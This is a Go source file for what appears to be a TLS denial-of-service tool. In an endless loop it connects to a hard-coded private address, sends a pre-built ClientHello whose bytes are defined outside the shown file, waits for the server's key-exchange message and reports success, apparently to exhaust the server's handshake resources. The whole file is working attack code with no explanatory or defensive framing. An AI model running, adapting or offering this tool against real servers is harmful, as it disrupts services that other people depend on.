package main

import (
	"encoding/binary"
	"io"
	"log"
	"net"
	"time"
)

func sendTLSDoS(c *net.TCPConn) (bool, error) {
	array := make([]byte, len(clientHello))
	copy(array, clientHello)
	i := 0
	for i < len(array) {
		n, err := c.Write(array[i:])
		if err != nil {
			return false, err
		}
		i += n
	}
	log.Println("Wrote ClientHello")

	for {
		var header [5]byte
		_, err := io.ReadFull(c, header[:])
		if err != nil {
			return false, err
		}
		content := make([]byte, binary.BigEndian.Uint16(header[3:5]))
		_, err = io.ReadFull(c, content)
		if err != nil {
			return false, err
		}
		if header[0] != 22 {
			log.Println("Invalid content type")
			continue
		}
		log.Printf("Handshake type: %d\n", content[0])
		if content[0] == 12 {
			return true, nil
		}
	}
}

func runTLSDoSInstance(addr *net.TCPAddr) {
	c, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		log.Println("Error: ", err)
		return
	}
	defer c.Close()
	ok, err := sendTLSDoS(c)
	if err != nil {
		log.Println(err)
		return
	}
	if ok {
		log.Println("Success")
	} else {
		log.Println("Failed")
	}
}

func main() {
	addr, err := net.ResolveTCPAddr("tcp", "192.168.56.200:10443")
	if err != nil {
		log.Println(err)
		return
	}
	for {
		runTLSDoSInstance(addr)
		time.Sleep(1 * time.Second)
	}
}
